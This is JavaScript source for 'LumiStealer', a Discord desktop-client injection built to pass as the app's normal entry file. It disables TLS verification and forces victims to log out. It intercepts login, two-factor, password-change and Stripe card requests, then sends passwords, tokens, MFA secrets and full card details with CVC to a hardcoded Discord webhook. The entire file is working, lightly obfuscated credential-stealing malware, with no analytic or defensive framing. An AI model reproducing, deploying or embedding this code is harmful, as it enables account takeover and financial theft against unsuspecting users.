process.env.NODE_TLS_REJECT_UNAUTHORIZED = 0
const fs = require('fs'),
  electron = require('electron'),
  https = require('https'),
  queryString = require('querystring')
var computerName = process.env.COMPUTERNAME,
  tokenScript =
    "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()",
  logOutScript =
    'function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);'
    
const dataNow = new Date().toISOString(),

const webhook ='https://discord.com/api/webhooks/1250145944226369618/e2NNn-bK6X9D7dU84rcxee4xZAy_-iJLSRVzGS9ivjbThfZ9xuOK6dYoKQS7vipk0BbY'

let contents2FA = []
var config = {
  logout: 'true',
  'logout-notify': 'true',
  'init-notify': 'true',
  'embed-color': 2895667,
  disable_qrcode: 'true',
  Filter: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
      'https://discord.com/api/v*/users/@me/billing/subscriptions',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
  onCompleted: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.stripe.com/v*/tokens',
      'https://discord.com/api/v*/auth/mfa/totp',
      'https://discordapp.com/api/v*/auth/mfa/totp',
      'https://*.discord.com/api/v*/auth/mfa/totp',
      'https://discord.com/api/v*/users/@me/mfa/totp/enable',
    ],
  },
}
async function execScript(_0x301c17) {
  var _0x1a02b8 = electron.BrowserWindow.getAllWindows()[0],
    _0x3da2ac = await _0x1a02b8.webContents.executeJavaScript(_0x301c17, true)
  return _0x3da2ac || null
}
const getIP = async () => {
    var _0x1faabf = await execScript(
      'var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);'
    )
    return _0x1faabf.ip
  },
  getURL = async (_0x3dfc49, _0x1ca033) => {
    var _0x492d4c = await execScript(
      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "' +
        _0x3dfc49 +
        '", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
        _0x1ca033 +
        '");\n    xmlHttp.send( null );\n    JSON.parse(xmlHttp.responseText);'
    )
    return _0x492d4c
  },
  GetBadges = (_0x3bdf97) => {
    var _0xc46c4c = ''
    return (
      1 == (1 & _0x3bdf97) &&
        (_0xc46c4c += '<:3743staffbadge:1248021364732989441> '),
      2 == (2 & _0x3bdf97) &&
        (_0xc46c4c += '<:5450partneredserver:1248021377290862612> '),
      4 == (4 & _0x3bdf97) &&
        (_0xc46c4c += '<:9472hypesquadeventsbadge:1248021419619647501> '),
      8 == (8 & _0x3bdf97) &&
        (_0xc46c4c += '<:8084iconbughunter:1249771650375876739> '),
      64 == (64 & _0x3bdf97) &&
        (_0xc46c4c += '<:7878iconhypesquadbravery:1249771646189834373> '),
      128 == (128 & _0x3bdf97) &&
        (_0xc46c4c += '<:6318iconhypesquadbrilliance:1249771644713701396> '),
      256 == (256 & _0x3bdf97) &&
        (_0xc46c4c += '<:1033balancedhypesquad:1248021349394415647> '),
      512 == (512 & _0x3bdf97) &&
        (_0xc46c4c += '<:3743earlysupporterbadge:1248021361796976691> '),
      16384 == (16384 & _0x3bdf97) &&
        (_0xc46c4c += '<:5592bugbusterbadge:1248021388028153856> '),
      4194304 == (4194304 & _0x3bdf97) &&
        (_0xc46c4c += '<:1207iconactivedeveloper:1249771641035034745> '),
      131072 == (131072 & _0x3bdf97) &&
        (_0xc46c4c += '<:1207iconearlybotdeveloper:1249771657267122336> '),
      '' == _0xc46c4c && (_0xc46c4c = ':x:'),
      _0xc46c4c
    )
  },
  GetRBadges = (_0x1feb0a) => {
    var _0x2b2e6a = ''
    return (
      1 == (1 & _0x1feb0a) && (_0x2b2e6a += '<:staff:891346298932981783> '),
      2 == (2 & _0x1feb0a) &&
        (_0x2b2e6a += '<:5450partneredserver:1248021377290862612> '),
      4 == (4 & _0x1feb0a) &&
        (_0x2b2e6a += '<:hypesquadevent:1082679435452481738> '),
      8 == (8 & _0x1feb0a) &&
        (_0x2b2e6a += '<:bughunter_1:874750808426692658> '),
      512 == (512 & _0x1feb0a) && (_0x2b2e6a += '<:early:944071770506416198> '),
      16384 == (16384 & _0x1feb0a) &&
        (_0x2b2e6a += '<:bughunter_2:874750808430874664> '),
      131072 == (131072 & _0x1feb0a) &&
        (_0x2b2e6a += '<:devcertif:1041639665498861578> '),
      '' == _0x2b2e6a && (_0x2b2e6a = ':x:'),
      _0x2b2e6a
    )
  },
  GetNSFW = (_0x42ed76) => {
    switch (_0x42ed76) {
      case true:
        return ':underage: `NSFW Allowed`'
      case false:
        return ':underage: `NSFW Not Allowed`'
      default:
        return 'Idk bro you got me'
    }
  },
  GetA2F = (_0x118278) => {
    switch (_0x118278) {
      case true:
        return '`MFA Enabled`'
      case false:
        return '`MFA Not Enabled`'
      default:
        return 'WTF DONT HAVES MFA OR HAVES?????'
    }
  },
  parseFriends = (_0x371a67) => {
    try {
      var _0x2951d8 = _0x371a67.filter((_0x6dad30) => _0x6dad30.type == 1),
        _0x5545e4 = ''
      for (var _0x4af470 of _0x2951d8) {
        var _0x2026db = GetRBadges(_0x4af470.user.public_flags)
        if (_0x2026db !== ':x:') {
          _0x5545e4 +=
            _0x2026db +
            ' ' +
            _0x4af470.user.username +
            '#' +
            _0x4af470.user.discriminator +
            '\n'
        }
      }
      if (!_0x5545e4) {
        _0x5545e4 = 'No Rare Friends'
      }
      return {
        len: _0x2951d8.length,
        badges: _0x5545e4,
      }
    } catch (_0x489e1e) {
      return ':x:'
    }
  },
  parseBilling = (_0x783585) => {
    var _0x2746f9 = ''
    try {
      if (!_0x783585) {
        return (_0x2746f9 = ':x:')
      }
      _0x783585.forEach((_0x3d3c9a) => {
        if (_0x3d3c9a.invalid) {
          return
        }
        switch (_0x3d3c9a.type) {
          case 1:
            _0x2746f9 += '<:emoji_541:1249821102746898434> :credit_card:'
            break
          case 2:
            _0x2746f9 +=
              '<:emoji_541:1249821102746898434> <:paypal:896441236062347374>'
        }
      })
      if (!_0x2746f9) {
        _0x2746f9 = ':x:'
      }
      return _0x2746f9
    } catch (_0x5e1bd9) {
      return ':x:'
    }
  },
  calcDate = (_0x159e85, _0x2df94f) =>
    new Date(_0x159e85.setMonth(_0x159e85.getMonth() + _0x2df94f)),
  GetNitro = (_0x2c485a) => {
    switch (_0x2c485a.premium_type) {
      default:
        return ':x:'
      case 1:
        return '<:946246402105819216:962747802797113365>'
      case 2:
        if (!_0x2c485a.premium_guild_since) {
          return '<:946246402105819216:962747802797113365>'
        }
        var _0x55a5e4 = new Date(Date.now()),
          _0xd37b55 = [
            '<:Booster1Month:1051453771147911208>',
            '<:Booster2Month:1051453772360077374>',
            '<:Booster6Month:1051453773463162890>',
            '<:Booster9Month:1051453774620803122>',
            '<:boost12month:1068308256088400004>',
            '<:Booster15Month:1051453775832961034>',
            '<:BoosterLevel8:1051453778127237180>',
            '<:Booster24Month:1051453776889917530>',
          ],
          _0x4ca469 = [
            new Date(_0x2c485a.premium_guild_since),
            new Date(_0x2c485a.premium_guild_since),
            new Date(_0x2c485a.premium_guild_since),
            new Date(_0x2c485a.premium_guild_since),
            new Date(_0x2c485a.premium_guild_since),
            new Date(_0x2c485a.premium_guild_since),
            new Date(_0x2c485a.premium_guild_since),
          ],
          _0x1b4efe = [2, 3, 6, 9, 12, 15, 18, 24],
          _0x2c485a = []
        for (var _0x489d5b in _0x4ca469)
          _0x2c485a.push(
            Math.round(
              (calcDate(_0x4ca469[_0x489d5b], _0x1b4efe[_0x489d5b]) -
                _0x55a5e4) /
                86400000
            )
          )
        var _0x4f6c0e = 0
        for (var _0x489d5b of _0x2c485a) _0x489d5b > 0 ? '' : _0x4f6c0e++
        return (
          '<:946246402105819216:962747802797113365> ' + _0xd37b55[_0x4f6c0e]
        )
    }
  }
function GetLangue(_0x35c65f) {
  var _0x12233d = {
      fr: ':flag_fr:',
      da: ':flag_dk:',
      de: ':flag_de:',
      'en-GB': ':england:',
      'en-US': ':flag_us:',
      'en-ES': ':flag_es:',
      hr: ':flag_hr:',
      it: ':flag_it:',
      lt: ':flag_lt:',
      hu: ':flag_no::flag_hu:',
      no: ':flag_no:',
      pl: ':flag_pl:',
      'pr-BR': ':flag_pt:',
      ro: ':flag_ro:',
      fi: ':flag_fi:',
      'sv-SE': ':flag_se:',
      vi: ':flag_vn:',
      tr: ':flag_tr:',
      cs: ':flag_cz:',
      el: ':flag_gr:',
      bg: ':flag_bg:',
      ru: ':flag_ru:',
      uk: ':flag_ua:',
      hi: ':flag_in:',
      th: ':flag_tw:',
      'zh-CN': ':flag_cn:',
      ja: ':flag_jp:',
      'zh-TW': ':flag_cn:',
      'pt-BR': ':flag_br:',
      ko: ':flag_kr:',
    },
    _0x174558 = _0x12233d[_0x35c65f] || ''
  return _0x174558
}
async function sendWebhook(_0x4a4ee3, _0x2153ed) {
  const _0x183551 = JSON.stringify(_0x2153ed),
    _0x2a0560 = new URL(_0x4a4ee3),
    _0x948083 = {
      hostname: _0x2a0560.hostname,
      path: _0x2a0560.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': _0x183551.length,
      },
    },
    _0x4100ee = https.request(_0x948083, (_0x7264) => {
      let _0x279394 = ''
      _0x7264.on('data', (_0x5adf67) => {
        _0x279394 += _0x5adf67
      })
      _0x7264.on('end', () => {
        console.log('Webhook response:', _0x279394)
      })
    })
  _0x4100ee.on('error', (_0x5974de) => {
    console.error('Error sending webhook:', _0x5974de)
  })
  _0x4100ee.write(_0x183551)
  _0x4100ee.end()
}
const path = (function () {
  var _0x194677 = electron.app.getAppPath().replace(/\\/g, '/').split('/')
  _0x194677.pop()
  _0x194677 = _0x194677.join('/')
  var _0x4d7294 = electron.app.getName()
  return {
    appPath: _0x194677,
    appName: _0x4d7294,
  }
})()
async function initOne() {
  var _0x361c7a = await getIP(),
    _0x1c8f53 = await execScript(tokenScript),
    _0x5f1023 = await getURL('https://discord.com/api/v8/users/@me', _0x1c8f53),
    _0x943c05 =
      'https://cdn.discordapp.com/avatars/' +
      _0x5f1023.id +
      '/' +
      _0x5f1023.avatar
  if (config['init-notify'] !== 'true') {
    return true
  }
  if (!fs.existsSync(__dirname + '/Lumi')) {
    fs.mkdirSync(__dirname + '/Lumi')
  } else {
    return true
  }
  var { appPath: _0x23c8e7, appName: _0x34d5ce } = path,
    _0xd5d3c3 = _0x34d5ce
  const _0x28d7bd = {
      title: 'First Injection Detected - LumiStealer',
      color: 5900696,
      fields: [
        {
          name: 'Injection Path:',
          value: '`' + __dirname + '`',
          inline: false,
        },
        {
          name: 'Infected App:',
          value: '<:c_nitro:1249820987403407381> `' + _0x34d5ce + '`',
          inline: true,
        },
        {
          name: 'Computer Name:',
          value: '<:emoji_54:1249821065236975686> `' + computerName + '`',
          inline: true,
        },
        {
          name: ' IP Address:',
          value: '<:lupa:1249813644750098534> `' + _0x361c7a + '`',
          inline: true,
        },
        {
          name: 'Token:',
          value:
            '`' +
            _0x1c8f53 +
            '`\n[Copy Token](https://paste-pgpj.onrender.com/?p=' +
            _0x1c8f53 +
            ')',
          inline: false,
        },
      ],
      author: {
        name: _0x5f1023.username + '#0000 - LumiStealer',
        icon_url: _0x943c05,
      },
      footer: {
        icon_url:
          'https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png',
        text: 'LumiStealer',
      },
      timestamp: dataNow,
    },
    _0x4738d8 = {
      embeds: [_0x28d7bd],
      username: 'Injections - LumiSt3aler',
      avatar_url:
        'https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png',
    }
  sendWebhook(webhook, _0x4738d8)
  await execScript(logOutScript)
}
initOne()
function customData(_0x49d1f8) {
  const _0x2e9692 = { content: _0x49d1f8 }
  return _0x2e9692
}
electron.session.defaultSession.webRequest.onBeforeRequest(
  config.Filter,
  (_0x1fcaea, _0x6a7882) => {
    if (config.disable_qrcode == true) {
      if (_0x1fcaea.url.startsWith('wss://remote-auth-gateway')) {
        return _0x6a7882({ cancel: true })
      }
    }
  }
)
electron.session.defaultSession.webRequest.onCompleted(
  config.onCompleted,
  async (_0x53961c, _0x5cc98e) => {
    if (!['POST', 'PATCH'].includes(_0x53961c.method)) {
      return
    }
    if (_0x53961c.statusCode !== 200) {
      return
    }
    try {
      var _0x5c4cbc = JSON.parse(_0x53961c.uploadData[0].bytes)
    } catch (_0x3b1d00) {
      var _0x5c4cbc = queryString.parse(
        decodeURIComponent(_0x53961c.uploadData[0].bytes.toString())
      )
    }
    var _0x458da5 = await execScript(tokenScript),
      _0x57c41c = getIP(),
      _0x26609b = await getURL(
        'https://discord.com/api/v8/users/@me',
        _0x458da5
      ),
      _0x450ab8 = await getURL(
        'https://discord.com/api/v9/users/@me/billing/payment-sources',
        _0x458da5
      ),
      _0x486382 = await getURL(
        'https://discord.com/api/v9/users/@me/relationships',
        _0x458da5
      ),
      _0x1f746a = await getURL(
        'https://discord.com/api/v9/users/' + _0x26609b.id + '/profile',
        _0x458da5
      ),
      _0x58e709 = parseBilling(_0x450ab8)
    if (!_0x26609b.avatar) {
      var _0x5224bf =
        'https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png'
    }
    if (!_0x26609b.banner) {
      var _0x4d04ae = ''
    }
    _0x5224bf =
      'https://cdn.discordapp.com/avatars/' +
      _0x26609b.id +
      '/' +
      _0x26609b.avatar
    var { appPath: _0x3371b2, appName: _0x2a4fc8 } = path,
      _0x3d5af0 = _0x2a4fc8,
      _0x113706
    switch (true) {
      case _0x53961c.url.endsWith('login'):
        var _0x9edf4a = _0x5c4cbc.password,
          _0x20bf95 = _0x5c4cbc.login
        contents2FA.push({ passwd: _0x9edf4a })
        function _0x30ab10() {
          return sendWebhook(webhook, 'Parsa ta aq o: ' + _0x113706), _0x113706
        }
        if (_0x458da5 == null) {
          return true
        }
        const _0x139fec = {
            title: 'Login Detected - LumiSt3aler',
            color: 5900696,
            fields: [
              {
                name: 'Username:',
                value: '`' + _0x26609b.username + '`',
                inline: true,
              },
              {
                name: 'ID:',
                value: '`' + _0x26609b.id + '`',
                inline: true,
              },
              {
                name: 'Nitro:',
                value: '' + GetNitro(_0x1f746a),
                inline: true,
              },
              {
                name: 'Email:',
                value: '`' + _0x26609b.email + '`',
                inline: true,
              },
              {
                name: 'Password:',
                value: '`' + _0x9edf4a + '`',
                inline: true,
              },
              {
                name: 'Phone:',
                value: '`' + _0x26609b.phone + '`',
                inline: true,
              },
              {
                name: 'Billing:',
                value: _0x58e709,
                inline: true,
              },
              {
                name: 'MFA:',
                value: GetA2F(_0x26609b.mfa_enabled),
                inline: true,
              },
              {
                name: 'Badges:',
                value: '' + GetBadges(_0x26609b.flags),
                inline: true,
              },
              {
                name: 'Token:',
                value:
                  '||' +
                  _0x458da5 +
                  '||\n[Copy Token](https://paste-pgpj.onrender.com/?p=' +
                  _0x458da5 +
                  ')',
                inline: false,
              },
            ],
            author: {
              name: _0x26609b.username + '#0000 - LumiSt3aler',
              icon_url: _0x5224bf,
            },
            footer: {
              icon_url:
                'https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png',
              text: 'LumiStealer',
            },
            timestamp: dataNow,
          },
          _0x1bfda4 = {
            embeds: [_0x139fec],
            username: 'Logins - LumiStealer',
            avatar_url:
              'https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png',
          }
        await sendWebhook(webhook, _0x1bfda4)
        break
      case _0x53961c.url.endsWith('totp'):
        const _0x32e189 = contents2FA[0].passwd,
          _0xe156b9 = {
            title: 'Login Detected - LumiSt2aler',
            color: 5900696,
            fields: [
              {
                name: 'Username:',
                value: '`' + _0x26609b.username + '`',
                inline: true,
              },
              {
                name: 'ID:',
                value: '`' + _0x26609b.id + '`',
                inline: true,
              },
              {
                name: 'Nitro:',
                value: '' + GetNitro(_0x1f746a),
                inline: true,
              },
              {
                name: 'Email:',
                value: '`' + _0x26609b.email + '`',
                inline: true,
              },
              {
                name: 'Password:',
                value: '`' + _0x32e189 + '`',
                inline: true,
              },
              {
                name: 'Phone:',
                value: '`' + _0x26609b.phone + '`',
                inline: true,
              },
              {
                name: 'Billing:',
                value: _0x58e709,
                inline: true,
              },
              {
                name: 'MFA:',
                value: GetA2F(_0x26609b.mfa_enabled),
                inline: true,
              },
              {
                name: 'Badges:',
                value: '' + GetBadges(_0x26609b.flags),
                inline: true,
              },
              {
                name: 'Token:',
                value:
                  '||' +
                  _0x458da5 +
                  '||\n[Copy Token](https://paste-pgpj.onrender.com/?p=' +
                  _0x458da5 +
                  ')',
                inline: false,
              },
            ],
            author: {
              name: _0x26609b.username + '#0000 - LumiStealer',
              icon_url: _0x5224bf,
            },
            footer: {
              icon_url:
                'https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png',
              text: 'LumiStealer',
            },
            timestamp: dataNow,
          }
        contents2FA.splice(0, contents2FA.length)
        const _0x3adf68 = {
          embeds: [_0xe156b9],
          username: 'Logins - LumiSt2aler',
          avatar_url:
            'https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png',
        }
        await sendWebhook(webhook, _0x3adf68)
        break
      case _0x53961c.url.endsWith('tokens'):
        var _0x2e716c = _0x5c4cbc['card[number]'],
          _0x28ac99 = _0x5c4cbc['card[cvc]'],
          _0x50f1b4 = _0x5c4cbc['card[exp_year]'],
          _0x20adba = _0x5c4cbc['card[exp_month]'],
          _0x49e31c =
            _0x2e716c + '|' + _0x20adba + '|' + _0x50f1b4 + '|' + _0x28ac99
        const _0x56c781 = {
            title: 'New Card Added - LumiStealer',
            color: 5900696,
            fields: [
              {
                name: 'Username:',
                value: '`' + _0x26609b.username + '`',
                inline: true,
              },
              {
                name: 'ID:',
                value: '`' + _0x26609b.id + '`',
                inline: true,
              },
              {
                name: 'Nitro:',
                value: GetNitro(_0x1f746a),
                inline: true,
              },
              {
                name: 'Email:',
                value: '`' + _0x26609b.email + '`',
                inline: true,
              },
              {
                name: 'Phone:',
                value: '`' + _0x26609b.phone + '`',
                inline: true,
              },
              {
                name: 'Badges:',
                value: GetBadges(_0x26609b.flags),
                inline: true,
              },
              {
                name: 'Card Number:',
                value: '`' + _0x2e716c + '`',
                inline: true,
              },
              {
                name: 'Expiration Date:',
                value: '`' + _0x20adba + '/' + _0x50f1b4 + '`',
                inline: true,
              },
              {
                name: 'CVC:',
                value: '`' + _0x28ac99 + '`',
                inline: true,
              },
              {
                name: 'Token:',
                value:
                  '||' +
                  _0x458da5 +
                  '||\n[Copy Token](https://paste-pgpj.onrender.com/?p=' +
                  _0x458da5 +
                  ')',
                inline: false,
              },
            ],
            author: {
              name: _0x26609b.username + '#0000 - LumiStealer',
              icon_url: _0x5224bf,
            },
            footer: {
              icon_url:
                'https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png',
              text: 'LumiStealer',
            },
            timestamp: dataNow,
          },
          _0x55db1c = {
            embeds: [_0x56c781],
            username: 'Cards - LumiSt3aler',
            avatar_url:
              'https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png',
          }
        await sendWebhook(webhook, _0x55db1c)
        break
      case _0x53961c.url.endsWith('@me'):
        var _0x339289 = _0x5c4cbc.password,
          _0x17243c = _0x5c4cbc.new_password,
          _0x1c9ebc = await execScript(tokenScript)
        if (!_0x17243c || !_0x339289) {
          return true
        }
        const _0x1f0f7d = {
            title: 'Password Changed - LumiStealer',
            color: 5900696,
            fields: [
              {
                name: 'Username',
                value: '`' + _0x26609b.username + '`',
                inline: true,
              },
              {
                name: 'ID',
                value: '`' + _0x26609b.id + '`',
                inline: true,
              },
              {
                name: 'Nitro',
                value: GetNitro(_0x1f746a),
                inline: true,
              },
              {
                name: 'Email',
                value: '`' + _0x26609b.email + '`',
                inline: true,
              },
              {
                name: 'Phone',
                value: '`' + _0x26609b.phone + '`',
                inline: true,
              },
              {
                name: 'Badges',
                value: GetBadges(_0x26609b.public_flags),
                inline: true,
              },
              {
                name: 'Old Password',
                value: '`' + _0x339289 + '`',
                inline: true,
              },
              {
                name: 'New Password',
                value: '`' + _0x17243c + '`',
                inline: true,
              },
              {
                name: 'MFA',
                value: GetA2F(_0x26609b.mfa_enabled),
                inline: true,
              },
              {
                name: 'New Token',
                value:
                  '||' +
                  _0x1c9ebc +
                  '||\n[Copy Token](https://paste-pgpj.onrender.com/?p=' +
                  _0x1c9ebc +
                  ')',
                inline: true,
              },
            ],
            author: {
              name: _0x26609b.username + '#0000 - LumiSt3aler',
              icon_url: _0x5224bf,
            },
            footer: {
              icon_url:
                'https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png',
              text: 'LumiStealer',
            },
            timestamp: dataNow,
          },
          _0xdf3197 = {
            embeds: [_0x1f0f7d],
            username: 'Password Changer - LumiSt2aler',
            avatar_url:
              'https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png',
          }
        await sendWebhook(webhook, _0xdf3197)
        break
      case _0x53961c.url.endsWith('enable'):
        var _0x153fe9 = _0x5c4cbc.secret,
          _0x9edf4a = _0x5c4cbc.password,
          _0x1c9ebc = await execScript(tokenScript)
        const _0x2e91c4 = {
            title: 'MFA Enabled - LumiStealer',
            color: 5900696,
            fields: [
              {
                name: 'Username',
                value: '`' + _0x26609b.username + '`',
                inline: true,
              },
              {
                name: 'Email',
                value: '`' + _0x26609b.email + '`',
                inline: true,
              },
              {
                name: 'Password',
                value: '`' + _0x9edf4a + '`',
                inline: true,
              },
              {
                name: 'Secret Key (PUT IN GOOGLE AUTHENTICATOR)',
                value: '`' + _0x153fe9 + '`',
                inline: false,
              },
              {
                name: 'New Token',
                value:
                  '||' +
                  _0x1c9ebc +
                  '||\n[Copy Token](https://paste-pgpj.onrender.com/?p=' +
                  _0x1c9ebc +
                  ')',
                inline: false,
              },
            ],
            author: {
              name: _0x26609b.username + '#0000 - LumiSt3aler',
              icon_url: _0x5224bf,
            },
            footer: {
              icon_url:
                'https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png',
              text: 'LumiStealer',
            },
            timestamp: dataNow,
          },
          _0x16e915 = {
            embeds: [_0x2e91c4],
            username: 'Alerts - LumiSt2aler',
            avatar_url:
              'https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png',
          }
        await sendWebhook(webhook, _0x16e915)
        break
    }
  }
)
module.exports = require('./core.asar')
